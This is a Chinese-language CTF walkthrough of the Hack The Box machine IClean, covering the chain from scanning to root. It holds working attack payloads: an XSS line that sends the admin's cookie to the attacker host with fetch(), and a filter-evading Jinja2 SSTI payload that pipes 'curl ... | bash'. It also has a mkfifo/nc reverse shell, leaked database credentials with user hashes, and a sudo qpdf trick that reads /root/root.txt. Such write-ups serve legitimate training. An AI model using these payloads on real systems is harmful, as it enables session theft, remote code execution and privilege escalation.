# 服务
```
┌──(root㉿kali)-[~]
└─# nmap -sV -Pn -A 10.10.11.12
Starting Nmap 7.93 ( https://nmap.org ) at 2024-07-26 04:28 EDT
Nmap scan report for 10.10.11.12
Host is up (0.44s latency).
Not shown: 998 closed tcp ports (reset)
PORT   STATE SERVICE VERSION
22/tcp open  ssh     OpenSSH 8.9p1 Ubuntu 3ubuntu0.6 (Ubuntu Linux; protocol 2.0)
| ssh-hostkey: 
|   256 2cf90777e3f13a36dbf23b94e3b7cfb2 (ECDSA)
|_  256 4a919ff274c04181524df1ff2d01786b (ED25519)
80/tcp open  http    Apache httpd 2.4.52 ((Ubuntu))
|_http-title: Site doesn't have a title (text/html).
|_http-server-header: Apache/2.4.52 (Ubuntu)
No exact OS matches for host (If you know what OS is running on it, see https://nmap.org/submit/ ).
TCP/IP fingerprint:
OS:SCAN(V=7.93%E=4%D=7/26%OT=22%CT=1%CU=30126%PV=Y%DS=2%DC=T%G=Y%TM=66A35E8
OS:3%P=x86_64-pc-linux-gnu)SEQ(SP=FF%GCD=1%ISR=105%TI=Z%CI=Z)SEQ(SP=FF%GCD=
OS:1%ISR=105%TI=Z%CI=Z%II=I%TS=A)OPS(O1=M53AST11NW7%O2=M53AST11NW7%O3=M53AN
OS:NT11NW7%O4=M53AST11NW7%O5=M53AST11NW7%O6=M53AST11)WIN(W1=FE88%W2=FE88%W3
OS:=FE88%W4=FE88%W5=FE88%W6=FE88)ECN(R=Y%DF=Y%T=40%W=FAF0%O=M53ANNSNW7%CC=Y
OS:%Q=)T1(R=Y%DF=Y%T=40%S=O%A=S+%F=AS%RD=0%Q=)T2(R=N)T3(R=N)T4(R=Y%DF=Y%T=4
OS:0%W=0%S=A%A=Z%F=R%O=%RD=0%Q=)T5(R=Y%DF=Y%T=40%W=0%S=Z%A=S+%F=AR%O=%RD=0%
OS:Q=)T6(R=Y%DF=Y%T=40%W=0%S=A%A=Z%F=R%O=%RD=0%Q=)T7(R=Y%DF=Y%T=40%W=0%S=Z%
OS:A=S+%F=AR%O=%RD=0%Q=)U1(R=Y%DF=N%T=40%IPL=164%UN=0%RIPL=G%RID=G%RIPCK=G%
OS:RUCK=G%RUD=G)IE(R=Y%DFI=N%T=40%CD=S)

Network Distance: 2 hops
Service Info: OS: Linux; CPE: cpe:/o:linux:linux_kernel

TRACEROUTE (using port 5900/tcp)
HOP RTT       ADDRESS
1   294.26 ms 10.10.16.1
2   534.10 ms 10.10.11.12

OS and Service detection performed. Please report any incorrect results at https://nmap.org/submit/ .
Nmap done: 1 IP address (1 host up) scanned in 63.54 seconds

```

写hosts
```
echo "10.10.11.12 capiclean.htb" >> /etc/hosts
```

发现一个输入框

![](IClean_files/1.png)

如果填入一个正常的邮箱会返回说后台人员会根据邮件很快回复我们

尝试xss


payload
```
<img src=x onerror=fetch('http://10.10.16.5:80/'+document.cookie);>
```

urlencode后插入到service这个字段
![](IClean_files/1.jpg)


开一个监听，拿到管理员的cookie
```
┌──(root㉿kali)-[~]
└─# nc -lnvp 80
listening on [any] 80 ...
connect to [10.10.16.5] from (UNKNOWN) [10.10.11.12] 42720
GET /session=eyJyb2xlIjoiMjEyMzJmMjk3YTU3YTVhNzQzODk0YTBlNGE4MDFmYzMifQ.ZqdtFg.kzjQBBHOHIO2dg2aorvGQoGaEGg HTTP/1.1
Host: 10.10.16.5
Connection: keep-alive
User-Agent: Mozilla/5.0 (X11; Linux x86_64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/116.0.0.0 Safari/537.36
Accept: */*
Origin: http://127.0.0.1:3000
Referer: http://127.0.0.1:3000/
Accept-Encoding: gzip, deflate
Accept-Language: en-US,en;q=0.9


```

使用cookie-editer加上上面cookie，可以访问dashboard


在Generate Invoice生成一个Invoice ID以后去到Generate QR页面

参考[这篇文章](https://kleiber.me/blog/2021/10/31/python-flask-jinja2-ssti-example/)


revshell
```
rm -f /tmp/f;mknod /tmp/f p;cat /tmp/f|/bin/sh -i 2>&1|nc 10.10.16.5 443 >/tmp/f
```

payload
```
{{request|attr("application")|attr("\x5f\x5fglobals\x5f\x5f")|attr("\x5f\x5fgetitem\x5f\x5f")("\x5f\x5fbuiltins\x5f\x5f")|attr("\x5f\x5fgetitem\x5f\x5f")("\x5f\x5fimport\x5f\x5f")("os")|attr("popen")("curl 10.10.16.5:80/revshell | bash")|attr("read")()}}
```

注入qr_link

![](IClean_files/2.jpg)

拿到rev shell

![](IClean_files/3.jpg)


app.py暴露出数据库密码
```
# Database Configuration
db_config = {
    'host': '127.0.0.1',
    'user': 'iclean',
    'password': 'pxCsmnGLckUb',
    'database': 'capiclean'
}
```

用户表
```
www-data@iclean:/opt/app$ mysql -u iclean -p           
mysql -u iclean -p
Enter password: pxCsmnGLckUb

mysql> show databases;
show databases;
+--------------------+
| Database           |
+--------------------+
| capiclean          |
| information_schema |
| performance_schema |
+--------------------+
3 rows in set (0.01 sec)

mysql> use capiclean;
use capiclean;
Reading table information for completion of table and column names
You can turn off this feature to get a quicker startup with -A

Database changed
mysql> show tables;
show tables;
+---------------------+
| Tables_in_capiclean |
+---------------------+
| quote_requests      |
| services            |
| users               |
+---------------------+
3 rows in set (0.00 sec)

mysql> select * from users;
select * from users;
+----+----------+------------------------------------------------------------------+----------------------------------+
| id | username | password                                                         | role_id                          |
+----+----------+------------------------------------------------------------------+----------------------------------+
|  1 | admin    | 2ae316f10d49222f369139ce899e414e57ed9e339bb75457446f2ba8628a6e51 | 21232f297a57a5a743894a0e4a801fc3 |
|  2 | consuela | 0a298fdd4d546844ae940357b631e40bf2a7847932f82c494daa1c9c5d6927aa | ee11cbb19052e40b07aac0ca060c23ee |
+----+----------+------------------------------------------------------------------+----------------------------------+
2 rows in set (0.00 sec)

mysql> 

```
consuela的哈希解出来密文密码是：```simple and clean```

正是用户的密码
```
www-data@iclean:/opt/app$ su consuela
su consuela
Password: simple and clean

consuela@iclean:/opt/app$ 

```

也可以ssh登录

# 提权


sudo 特权
```
consuela@iclean:~$ sudo -l
[sudo] password for consuela: 
Matching Defaults entries for consuela on iclean:
    env_reset, mail_badpass, secure_path=/usr/local/sbin\:/usr/local/bin\:/usr/sbin\:/usr/bin\:/sbin\:/bin\:/snap/bin, use_pty

User consuela may run the following commands on iclean:
    (ALL) /usr/bin/qpdf
consuela@iclean:~$ 

```

尝试执行
```
consuela@iclean:~$ sudo /usr/bin/qpdf

qpdf: an input file name is required

For help:
  qpdf --help=usage       usage information
  qpdf --help=topic       help on a topic
  qpdf --help=--option    help on an option
  qpdf --help             general help and a topic list

```

把root.txt作为附件放入1.pdf
```
consuela@iclean:/tmp$ sudo -S /usr/bin/qpdf --empty 1.pdf -qdf --add-attachment /root/root.txt --
```
查看1.pdf,可以看到root.txt
```
consuela@iclean:/tmp$ strings 1.pdf
%PDF-1.3
%QDF-1.0
%% Original object ID: 1 0
1 0 obj
  /Names <<
    /EmbeddedFiles 2 0 R
  >>
  /PageMode /UseAttachments
  /Pages 3 0 R
  /Type /Catalog
endobj
%% Original object ID: 5 0
2 0 obj
  /Names [
    (root.txt)
    4 0 R
endobj
%% Original object ID: 2 0
3 0 obj
  /Count 0
  /Kids [
  /Type /Pages
endobj
%% Original object ID: 4 0
4 0 obj
  /EF <<
    /F 5 0 R
    /UF 5 0 R
  >>
  /F (root.txt)
  /Type /Filespec
  /UF (root.txt)
endobj
%% Original object ID: 3 0
5 0 obj
  /Params <<
    /CheckSum <d04ed9c1fb76363ae01813c53282fc84>
    /CreationDate (D:20240730082514Z)
    /ModDate (D:20240730082514Z)
    /Size 33
  >>
  /Type /EmbeddedFile
  /Length 6 0 R
stream
d4eddf40caed3ab97481938049fd6948
endstream
endobj
6 0 obj
endobj
xref
0000000000 65535 f 
0000000052 00000 n 
0000000203 00000 n 
0000000292 00000 n 
0000000381 00000 n 
0000000522 00000 n 
0000000783 00000 n 
trailer <<
  /Root 1 0 R
  /Size 7
  /ID [<9653a9f96670fb1e17d1ef5fd55224be><9653a9f96670fb1e17d1ef5fd55224be>]
startxref
%%EOF

```